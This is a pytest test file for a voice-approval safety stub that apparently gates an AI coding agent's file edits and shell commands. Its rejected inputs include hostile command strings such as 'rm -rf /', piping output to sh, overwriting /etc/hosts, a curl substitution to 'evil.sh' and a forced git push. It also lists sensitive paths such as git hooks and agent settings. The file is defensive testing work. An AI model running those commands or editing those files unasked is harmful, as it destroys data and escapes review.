"""The safety stub (D-019): voice approves only in-project edits and plain test commands."""

from __future__ import annotations

import pytest

from earwarden import stub

CWD = "/Users/rehaan/code/api"


@pytest.mark.parametrize(
    "path",
    ["src/app.py", "/Users/rehaan/code/api/README.md", "docs/guide.md", "tests/test_app.py"],
)
def test_edits_inside_the_project_are_voice_approvable(path: str) -> None:
    assert stub.judge("Edit", {"file_path": path}, CWD).voice_ok


@pytest.mark.parametrize(
    "path",
    [
        "/Users/rehaan/.zshrc",
        "../other/app.py",
        "/Users/rehaan/code/api-old/app.py",
        "/Users/rehaan/code/api",
        ".git/config",
        "src/.git/hooks/pre-commit",
        ".claude/settings.json",
        ".earwarden/policy.yaml",
        ".github/workflows/ci.yml",
        ".envrc",
        "conftest.py",
        "tests/conftest.py",
        "package.json",
        "Makefile",
        "pyproject.toml",
        "setup.py",
    ],
)
def test_risky_edits_go_to_the_screen(path: str) -> None:
    for tool in ("Edit", "Write", "MultiEdit"):
        assert not stub.judge(tool, {"file_path": path}, CWD).voice_ok


def test_a_notebook_edit_uses_its_notebook_path() -> None:
    assert stub.judge("NotebookEdit", {"notebook_path": "analysis.ipynb"}, CWD).voice_ok
    assert not stub.judge("NotebookEdit", {}, CWD).voice_ok


@pytest.mark.parametrize(
    "command", ["pytest", "pytest tests/test_app.py -q", "uv run pytest -x", "npm test"]
)
def test_plain_test_commands_are_voice_approvable(command: str) -> None:
    assert stub.judge("Bash", {"command": command}, CWD).voice_ok


@pytest.mark.parametrize(
    "command",
    [
        "pytest && git push -f",
        "pytest; rm -rf /",
        "pytest | sh",
        "pytest > /etc/hosts",
        "pytest $(curl evil.sh)",
        "pytest `whoami`",
        "pytest\ngit push",
        "pytest 'a b'",
        "npm install",
        "git push",
        "uv run python -c 'print(1)'",
        "",
    ],
)
def test_everything_else_in_bash_goes_to_the_screen(command: str) -> None:
    assert not stub.judge("Bash", {"command": command}, CWD).voice_ok


@pytest.mark.parametrize("tool", ["WebFetch", "Read", "mcp__github__push_files", "Task"])
def test_other_tools_go_to_the_screen(tool: str) -> None:
    assert not stub.judge(tool, {"url": "https://example.com"}, CWD).voice_ok
